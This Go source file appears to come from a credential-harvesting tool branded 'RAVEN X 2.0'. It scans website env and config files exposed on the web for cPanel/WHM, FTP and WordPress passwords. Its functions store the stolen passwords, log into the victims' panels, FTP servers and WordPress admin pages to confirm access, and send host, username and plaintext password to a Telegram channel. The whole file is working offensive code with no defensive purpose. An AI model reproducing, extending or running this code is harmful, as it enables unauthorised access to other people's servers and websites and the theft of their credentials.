package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// extractWebPanelCredsFromText
//
// Scans env/config file bodies for cPanel/WHM, FTP, and WordPress credential
// clusters using an 8-line proximity window around each host key match.
// Dispatches to CheckCPanel, CheckFTP, and CheckWordPress as appropriate.
//
// Useful paths for web panel detection (add to main.go backup scanner):
//   /wp-login.php, /wp-admin/, /administrator/, /admin/login, /:2082, /:2083
// ---------------------------------------------------------------------------

func (a *AWSScanner) extractWebPanelCredsFromText(text, sourceURL string) {
	// Gate: at least one web-panel validator must be enabled
	if !a.Config.APIValidation.CPanel && !a.Config.APIValidation.FTP && !a.Config.APIValidation.WordPress {
		return
	}

	lines := strings.Split(text, "\n")
	const windowSize = 8

	// Helper: build a window string centred on line i
	windowAround := func(i int) string {
		start := i - windowSize
		if start < 0 {
			start = 0
		}
		end := i + windowSize
		if end > len(lines) {
			end = len(lines)
		}
		return strings.Join(lines[start:end], "\n")
	}

	// -----------------------------------------------------------------------
	// cPanel / WHM
	// -----------------------------------------------------------------------
	if a.Config.APIValidation.CPanel {
		cpHostPat := regexp.MustCompile(`(?i)(?:CPANEL_HOST|CPANEL_DOMAIN|PANEL_HOST|WHM_HOST)\s*[=:]\s*["']?([a-zA-Z0-9._-]{3,253})["']?`)
		cpUserPat := regexp.MustCompile(`(?i)(?:CPANEL_USER(?:NAME)?|WHM_USER|PANEL_USER)\s*[=:]\s*["']?([a-zA-Z0-9._-]{1,64})["']?`)
		cpPassPat := regexp.MustCompile(`(?i)(?:CPANEL_PASS(?:WORD)?|WHM_PASS|PANEL_PASS)\s*[=:]\s*["']?([^\s"']{4,200})["']?`)

		for i, line := range lines {
			hm := cpHostPat.FindStringSubmatch(line)
			if hm == nil {
				continue
			}
			host := strings.TrimSpace(hm[1])
			if host == "" {
				continue
			}

			window := windowAround(i)
			um := cpUserPat.FindStringSubmatch(window)
			pm := cpPassPat.FindStringSubmatch(window)
			if um == nil || pm == nil {
				continue
			}
			user := strings.TrimSpace(um[1])
			pass := strings.TrimSpace(pm[1])
			if user == "" || pass == "" || len(pass) < 4 {
				continue
			}

			key := "panel:cpanel:" + user + "@" + host
			if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
				continue
			}

			a.logFound("cPanel Credentials", fmt.Sprintf("%s@%s", user, host), sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), host, user, pass), "cpanel_found.txt")

			globalCounters.mu.Lock()
			globalCounters.APIsFoundTotal++
			globalCounters.mu.Unlock()

			go a.CheckCPanel(host, user, pass, sourceURL)
		}
	}

	// -----------------------------------------------------------------------
	// FTP
	// -----------------------------------------------------------------------
	if a.Config.APIValidation.FTP {
		ftpHostPat := regexp.MustCompile(`(?i)(?:FTP_HOST|FTP_SERVER|SFTP_HOST)\s*[=:]\s*["']?([a-zA-Z0-9._-]{3,253})["']?`)
		ftpPortPat := regexp.MustCompile(`(?i)(?:FTP_PORT|SFTP_PORT)\s*[=:]\s*["']?(\d{1,5})["']?`)
		ftpUserPat := regexp.MustCompile(`(?i)FTP_USER(?:NAME)?\s*[=:]\s*["']?([a-zA-Z0-9._@-]{1,64})["']?`)
		ftpPassPat := regexp.MustCompile(`(?i)FTP_PASS(?:WORD)?\s*[=:]\s*["']?([^\s"']{4,200})["']?`)

		for i, line := range lines {
			hm := ftpHostPat.FindStringSubmatch(line)
			if hm == nil {
				continue
			}
			host := strings.TrimSpace(hm[1])
			if host == "" {
				continue
			}

			window := windowAround(i)

			// For SFTP_HOST, skip if SFTP_PORT is 22 (treat as SSH not FTP)
			isSFTP := strings.Contains(strings.ToUpper(line), "SFTP_HOST")
			if isSFTP {
				if pm := ftpPortPat.FindStringSubmatch(window); pm != nil {
					if pm[1] == "22" {
						continue
					}
				}
			}

			port := "21"
			if pm := ftpPortPat.FindStringSubmatch(window); pm != nil {
				port = pm[1]
			}

			um := ftpUserPat.FindStringSubmatch(window)
			pm2 := ftpPassPat.FindStringSubmatch(window)
			if um == nil || pm2 == nil {
				continue
			}
			user := strings.TrimSpace(um[1])
			pass := strings.TrimSpace(pm2[1])
			if user == "" || pass == "" || len(pass) < 4 {
				continue
			}

			key := "panel:ftp:" + user + "@" + host
			if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
				continue
			}

			a.logFound("FTP Credentials", fmt.Sprintf("%s@%s:%s", user, host, port), sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, user, pass), "ftp_found.txt")

			globalCounters.mu.Lock()
			globalCounters.APIsFoundTotal++
			globalCounters.mu.Unlock()

			go a.CheckFTP(host, port, user, pass, sourceURL)
		}

		// Also extract raw ftp:// URLs
		a.extractFTPFromEnv(text, sourceURL)
	}

	// -----------------------------------------------------------------------
	// WordPress
	// -----------------------------------------------------------------------
	if a.Config.APIValidation.WordPress {
		wpHostPat := regexp.MustCompile(`(?i)(?:WP_HOME|WORDPRESS_URL)\s*[=:]\s*["']?(https?://[^\s"']{3,253})["']?`)
		wpUserPat := regexp.MustCompile(`(?i)(?:WP_ADMIN_USER|WORDPRESS_ADMIN_USER|WP_USER|ADMIN_USER)\s*[=:]\s*["']?([a-zA-Z0-9._@-]{1,64})["']?`)
		wpPassPat := regexp.MustCompile(`(?i)(?:WP_ADMIN_PASS(?:WORD)?|WORDPRESS_ADMIN_PASS|ADMIN_PASS(?:WORD)?)\s*[=:]\s*["']?([^\s"']{4,200})["']?`)

		for i, line := range lines {
			hm := wpHostPat.FindStringSubmatch(line)
			var siteURL string
			if hm != nil {
				siteURL = strings.TrimSpace(hm[1])
			}

			// Fall back to sourceURL-derived host when no WP_HOME/WORDPRESS_URL is present
			if hm == nil {
				// only enter WordPress block if there's a user or pass key in this line
				if !regexp.MustCompile(`(?i)WP_ADMIN_USER|WORDPRESS_ADMIN_USER|WP_USER\b|WP_ADMIN_PASS|ADMIN_PASS`).MatchString(line) {
					continue
				}
				// derive siteURL from sourceURL
				if sourceURL != "" {
					parsed, err := url.Parse(sourceURL)
					if err == nil && parsed.Host != "" {
						siteURL = parsed.Scheme + "://" + parsed.Host
					}
				}
				if siteURL == "" {
					continue
				}
			}

			window := windowAround(i)
			um := wpUserPat.FindStringSubmatch(window)
			pm := wpPassPat.FindStringSubmatch(window)
			if um == nil || pm == nil {
				continue
			}
			user := strings.TrimSpace(um[1])
			pass := strings.TrimSpace(pm[1])
			if user == "" || pass == "" || len(pass) < 4 {
				continue
			}

			key := "panel:wordpress:" + user + "@" + siteURL
			if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
				continue
			}

			a.logFound("WordPress Credentials", fmt.Sprintf("%s @ %s", user, siteURL), sourceURL)
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), siteURL, user, pass), "wordpress_found.txt")

			globalCounters.mu.Lock()
			globalCounters.APIsFoundTotal++
			globalCounters.mu.Unlock()

			go a.CheckWordPress(siteURL, user, pass, sourceURL)
		}
	}
}

// extractFTPFromEnv extracts raw ftp:// URLs of the form ftp://user:pass@host:port/path
// and dispatches CheckFTP for each unique credential set found.
func (a *AWSScanner) extractFTPFromEnv(text, sourceURL string) {
	if !a.Config.APIValidation.FTP {
		return
	}

	ftpURLPat := regexp.MustCompile(`(?i)ftp://([^:@\s"']+):([^@\s"']+)@([a-zA-Z0-9._-]{3,253})(?::(\d{1,5}))?(?:/[^\s"']*)?`)

	for _, m := range ftpURLPat.FindAllStringSubmatch(text, -1) {
		user := m[1]
		pass := m[2]
		host := m[3]
		port := "21"
		if m[4] != "" {
			port = m[4]
		}

		if user == "" || pass == "" || host == "" || len(pass) < 4 {
			continue
		}

		key := "panel:ftp:" + user + "@" + host
		if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
			continue
		}

		a.logFound("FTP URL Credentials", fmt.Sprintf("%s@%s:%s", user, host, port), sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, user, pass), "ftp_found.txt")

		globalCounters.mu.Lock()
		globalCounters.APIsFoundTotal++
		globalCounters.mu.Unlock()

		go a.CheckFTP(host, port, user, pass, sourceURL)
	}
}

// ---------------------------------------------------------------------------
// CheckCPanel validates cPanel / WHM credentials against a host.
// Tries HTTP port 2082 and HTTPS port 2083 for cPanel, then WHM on 2086/2087.
// Returns true if any login attempt succeeds.
// ---------------------------------------------------------------------------

func (a *AWSScanner) CheckCPanel(host, user, pass, sourceURL string) bool {
	if !a.Config.APIValidation.CPanel {
		return false
	}

	pair := fmt.Sprintf("%s@%s", user, host)
	if _, loaded := a.KnownKeys.LoadOrStore("cpanelvalid:"+pair, true); loaded {
		return false
	}

	endpoints := []struct {
		label string
		rawURL string
	}{
		{"cPanel HTTP", fmt.Sprintf("http://%s:2082/login/", host)},
		{"cPanel HTTPS", fmt.Sprintf("https://%s:2083/login/", host)},
		{"WHM HTTP", fmt.Sprintf("http://%s:2086/login/", host)},
		{"WHM HTTPS", fmt.Sprintf("https://%s:2087/login/", host)},
	}

	formBody := url.Values{}
	formBody.Set("user", user)
	formBody.Set("pass", pass)

	httpClient := &http.Client{
		Timeout: 15 * time.Second,
		// Do NOT follow redirects — we inspect Location headers ourselves.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, ep := range endpoints {
		req, err := http.NewRequest("POST", ep.rawURL, strings.NewReader(formBody.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := httpClient.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		resp.Body.Close()

		location := resp.Header.Get("Location")
		bodyStr := string(body)

		success := false
		// Success indicators: 302 + Location contains /frontend/ or /cpsessXXX
		if resp.StatusCode == 302 && (strings.Contains(location, "/frontend/") || strings.Contains(location, "/cpsess")) {
			success = true
		}
		// Or 200 with cPanel body and redirect hint
		if resp.StatusCode == 200 && strings.Contains(bodyStr, "cPanel") && strings.Contains(location, "/cpanel/") {
			success = true
		}

		if success {
			a.logValid("cPanel", fmt.Sprintf("user=%s host=%s (%s)", user, host, ep.label))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), host, user, pass), "valid_cpanel.txt")
			a.storeValidKeyLimit("cPanel", pair, fmt.Sprintf("%s @ %s", user, host))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🖥️ <b>CPANEL ACCESS</b>\n\n🌐 <b>Host:</b> <code>%s</code>\n👤 <b>User:</b> <code>%s</code>\n🔐 <b>Pass:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
				host, user, pass, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// CheckFTP validates FTP credentials using raw TCP — no external dependencies.
// Implements the minimal FTP handshake: banner → USER → PASS.
// Returns true on 230 (login successful).
// ---------------------------------------------------------------------------

func (a *AWSScanner) CheckFTP(host, port, user, pass, sourceURL string) bool {
	if !a.Config.APIValidation.FTP {
		return false
	}

	triplet := fmt.Sprintf("%s:%s:%s", host, port, user)
	if _, loaded := a.KnownKeys.LoadOrStore("ftpvalid:"+triplet, true); loaded {
		return false
	}

	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 10*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second)) //nolint:errcheck

	reader := bufio.NewReader(conn)

	// Read banner — expect 220
	banner, err := reader.ReadString('\n')
	if err != nil || !strings.HasPrefix(strings.TrimSpace(banner), "220") {
		return false
	}

	// Send USER
	fmt.Fprintf(conn, "USER %s\r\n", user) //nolint:errcheck
	userResp, err := reader.ReadString('\n')
	if err != nil || !strings.HasPrefix(strings.TrimSpace(userResp), "331") {
		return false
	}

	// Send PASS
	fmt.Fprintf(conn, "PASS %s\r\n", pass) //nolint:errcheck
	passResp, err := reader.ReadString('\n')
	if err != nil {
		return false
	}
	passCode := strings.TrimSpace(passResp)

	if !strings.HasPrefix(passCode, "230") {
		return false
	}

	// Login successful
	a.logValid("FTP", fmt.Sprintf("user=%s host=%s port=%s", user, host, port))
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, user, pass), "valid_ftp.txt")
	a.storeValidKeyLimit("FTP", triplet, fmt.Sprintf("%s@%s:%s", user, host, port))

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n📁 <b>FTP ACCESS</b>\n\n🌐 <b>Host:</b> <code>%s:%s</code>\n👤 <b>User:</b> <code>%s</code>\n🔐 <b>Pass:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
		host, port, user, pass, sourceURL)
	go a.sendTelegram(msg)
	return true
}

// ---------------------------------------------------------------------------
// CheckWordPress validates WordPress admin credentials via wp-login.php and
// the WP REST API with HTTP Basic auth.
// Returns true if either method confirms a successful login.
// ---------------------------------------------------------------------------

func (a *AWSScanner) CheckWordPress(siteURL, user, pass, sourceURL string) bool {
	if !a.Config.APIValidation.WordPress {
		return false
	}

	pair := fmt.Sprintf("%s@%s", user, siteURL)
	if _, loaded := a.KnownKeys.LoadOrStore("wpvalid:"+pair, true); loaded {
		return false
	}

	// Normalize siteURL — strip trailing slash
	siteURL = strings.TrimRight(siteURL, "/")

	httpClient := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// --- Method 1: wp-login.php form POST ---
	loginURL := siteURL + "/wp-login.php"
	formBody := url.Values{}
	formBody.Set("log", user)
	formBody.Set("pwd", pass)
	formBody.Set("wp-submit", "Log In")
	formBody.Set("redirect_to", "/wp-admin/")
	formBody.Set("testcookie", "1")

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(formBody.Encode()))
	if err == nil {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Cookie", "wordpress_test_cookie=WP+Cookie+check")

		resp, err := httpClient.Do(req)
		if err == nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
			resp.Body.Close()
			location := resp.Header.Get("Location")
			bodyStr := string(body)

			loginOK := false
			// 302 redirect to /wp-admin/ = success
			if resp.StatusCode == 302 && strings.Contains(location, "/wp-admin/") {
				loginOK = true
			}
			// 200 body containing wp-admin but no "incorrect" = success
			if resp.StatusCode == 200 && strings.Contains(bodyStr, "wp-admin") && !strings.Contains(strings.ToLower(bodyStr), "incorrect") {
				loginOK = true
			}

			if loginOK {
				a.logValid("WordPress", fmt.Sprintf("user=%s site=%s", user, siteURL))
				a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), siteURL, user, pass), "valid_wordpress.txt")
				a.storeValidKeyLimit("WordPress", pair, siteURL)

				globalCounters.mu.Lock()
				globalCounters.APIsValidated++
				globalCounters.mu.Unlock()

				msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🔑 <b>WORDPRESS ACCESS</b>\n\n🌐 <b>Site:</b> <code>%s</code>\n👤 <b>User:</b> <code>%s</code>\n🔐 <b>Pass:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
					siteURL, user, pass, sourceURL)
				go a.sendTelegram(msg)
				return true
			}
		}
	}

	// --- Method 2: REST API Basic auth ---
	restURL := siteURL + "/wp-json/wp/v2/users?per_page=1"
	req2, err := http.NewRequest("GET", restURL, nil)
	if err != nil {
		return false
	}
	creds := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
	req2.Header.Set("Authorization", "Basic "+creds)

	resp2, err := httpClient.Do(req2)
	if err != nil {
		return false
	}
	resp2.Body.Close()

	if resp2.StatusCode == 200 {
		a.logValid("WordPress (REST)", fmt.Sprintf("user=%s site=%s", user, siteURL))
		a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), siteURL, user, pass), "valid_wordpress.txt")
		a.storeValidKeyLimit("WordPress", pair, siteURL)

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🔑 <b>WORDPRESS REST ACCESS</b>\n\n🌐 <b>Site:</b> <code>%s</code>\n👤 <b>User:</b> <code>%s</code>\n🔐 <b>Pass:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
			siteURL, user, pass, sourceURL)
		go a.sendTelegram(msg)
		return true
	}

	return false
}
